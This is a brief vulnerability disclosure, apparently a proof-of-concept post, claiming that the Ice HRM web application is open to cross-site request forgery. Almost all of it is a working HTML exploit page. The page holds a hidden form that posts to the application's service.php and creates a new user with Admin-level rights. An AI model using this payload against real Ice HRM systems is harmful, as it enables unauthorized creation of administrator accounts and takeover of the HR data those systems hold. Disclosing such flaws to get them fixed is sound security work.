The Ice HRM Web Application is vulnerable to CSRF to add an arbitrary user

CSRF POC:
````
<html>

  <body>

  <script>history.pushState('', '', '/')</script>

    <form action="http://HOSTHERE/icehrm/app/service.php">

      <input type="hidden" name="t" value="User" />

      <input type="hidden" name="a" value="ca" />

      <input type="hidden" name="sa" value="saveUser" />

      <input type="hidden" name="mod" value="admin&#61;users" />

      <input type="hidden" name="req" value="&#123;&quot;username&quot;&#58;&quot;test&quot;&#44;&quot;email&quot;&#58;&quot;test&#64;test&#46;com&quot;&#44;&quot;employee&quot;&#58;&quot;1&quot;&#44;&quot;user&#95;level&quot;&#58;&quot;Admin&quot;&#44;&quot;user&#95;roles&quot;&#58;&quot;&#91;&#92;&quot;2&#92;&quot;&#93;&quot;&#44;&quot;lang&quot;&#58;&quot;NULL&quot;&#44;&quot;default&#95;module&quot;&#58;&quot;NULL&quot;&#44;&quot;csrf&quot;&#58;&quot;c0bdded55472fab56c578386143a1854e6f8dd11&quot;&#125;" />

      <input type="submit" value="Submit request" />

    </form>

  </body>

</html>


````
